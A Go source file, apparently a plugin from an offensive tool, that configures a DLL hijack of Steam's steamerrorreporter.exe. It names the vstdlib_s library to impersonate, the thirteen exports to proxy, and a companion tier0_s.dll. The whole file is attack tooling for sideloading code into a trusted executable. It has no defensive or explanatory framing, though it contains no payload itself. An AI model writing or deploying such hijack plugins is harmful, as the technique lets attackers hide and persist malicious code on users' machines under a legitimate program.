package plugins

// PreloadDllHijackSteam 位于 steam 安装目录的 steamerrorreporter.exe
type PreloadDllHijackSteam struct {
	SubPluginPreloadDllHijackX86
}

func (p *PreloadDllHijackSteam) GetMainProgramName() (string) {
	return "steamerrorreporter"
}

func (p *PreloadDllHijackSteam) GetDllName() (string) {
	return "vstdlib_s"
}

func (p *PreloadDllHijackSteam) GetPluginName() (string) {
	return "preload_dll_hijack_steam"
}

func (p *PreloadDllHijackSteam) GetDllExports() []string {
	return []string{
		"V_snprintf",	
		"V_vsnwprintf",	
		"V_strncat",	
		"V_UTF8ToUTF16",	
		"V_UTF16ToUTF8",	
		"V_StripTrailingSlash",	
		"V_StripLastDir",	
		"V_FixSlashes",	
		"V_strncpy",	
		"V_strncat_length",	
		"V_RemoveDotSlashes",	
		"V_IsAbsolutePath",	
		"V_FixDoubleSlashes",
	}
}

// GetExtraFileList 获取额外的文件列表，某些情况下exe可能导入的dll不止一个，但我们只对其中一个进行劫持，其他的dll在该列表中体现
func (p *PreloadDllHijackSteam) GetExtraFileList() ([]string) {
	return []string{
		"tier0_s.dll",
	}
}